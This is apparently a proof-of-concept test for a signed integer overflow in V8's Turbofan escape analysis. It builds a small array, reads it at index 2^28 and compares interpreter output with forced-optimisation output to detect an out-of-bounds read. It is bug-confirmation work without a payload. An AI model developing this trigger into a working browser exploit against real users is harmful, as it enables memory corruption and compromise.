// PoC 1: Escape Analysis Signed Integer Overflow
// Target: escape-analysis.cc:563 — (index << ElementSizeLog2Of(representation))
// Bug:    For kTagged elements (log2=3), index >= 268435456 overflows signed int32,
//         wrapping to a negative offset that bypasses the bounds check in FieldAt()
//         and reads ZoneVector<Variable> out-of-bounds (DCHECK-only guard stripped
//         in release builds).
//
// Strategy: DIFFERENTIAL TESTING
//   Run the function in interpreter vs Turbofan-optimised mode.
//   If the bug fires, the optimised version either:
//     (a) crashes  (CHECK failure / segfault)
//     (b) returns a wrong value  (type confusion observable as non-undefined result)
//
// Flags: --allow-natives-syntax

"use strict";

// The boundary index: 2^28 = 268435456.
// index << 3 (kTagged element size log2) = 268435456 * 8 = 2147483648 = INT_MIN (overflow).
const OVERFLOW_IDX = 268435456;

// ── helper ──────────────────────────────────────────────────────────────────
function assert(cond, msg) {
  if (!cond) { print("[FAIL] " + msg); } else { print("[PASS] " + msg); }
}

// ── victim function ──────────────────────────────────────────────────────────
// arr is intentionally tiny (2 tagged elements) so escape analysis may treat
// it as a virtual (non-escaping) allocation, which is the precondition for
// OffsetOfElementsAccess to be invoked.
function victim(sentinel) {
  const arr = [sentinel, sentinel + 1];   // kTagged elements, 2-element array
  const r0  = arr[0];                     // warm field access
  const oob = arr[OVERFLOW_IDX];          // constant index → NumberConstant node
  // prevent DCE: consume both values
  return (oob === undefined) ? r0 : oob;
}

// ── step 1: capture interpreter result (unoptimised baseline) ────────────────
%NeverOptimizeFunction(victim);
const interp_result = victim(0x1337);
print("Interpreter result : " + interp_result + "  (expected: 0x1337 = 4919)");

// ── step 2: optimised version ────────────────────────────────────────────────
function victim_opt(sentinel) {
  const arr = [sentinel, sentinel + 1];
  const r0  = arr[0];
  const oob = arr[OVERFLOW_IDX];
  return (oob === undefined) ? r0 : oob;
}

// Warm up through interpreter first so feedback is stable
for (let i = 0; i < 1000; i++) victim_opt(i & 0xff);

// Force Turbofan (not Maglev) compilation
%OptimizeFunctionOnNextCall(victim_opt);
const opt_result = victim_opt(0x1337);
print("Turbofan result    : " + opt_result + "  (expected: 0x1337 = 4919)");

// ── step 3: evaluate ─────────────────────────────────────────────────────────
assert(interp_result === 4919, "interpreter returned correct sentinel");
assert(opt_result    === 4919, "Turbofan returned correct sentinel (no type confusion)");

if (interp_result !== opt_result) {
  print("");
  print("!!! DIFFERENTIAL MISMATCH — optimiser diverges from interpreter !!!");
  print("    Interpreter : " + interp_result);
  print("    Turbofan    : " + opt_result);
  print("    The escape-analysis signed-overflow bug is CONFIRMED.");
} else {
  print("");
  print("No differential mismatch observed.");
  print("Possible reasons: (a) Turbofan didn't virtualise 'arr', so the vulnerable");
  print("  code path was never taken; (b) the overflow happened but ZoneVector OOB");
  print("  read silently returned a value that still passes the logic; (c) bug is");
  print("  present but this specific input doesn't reach the vulnerable path.");
}
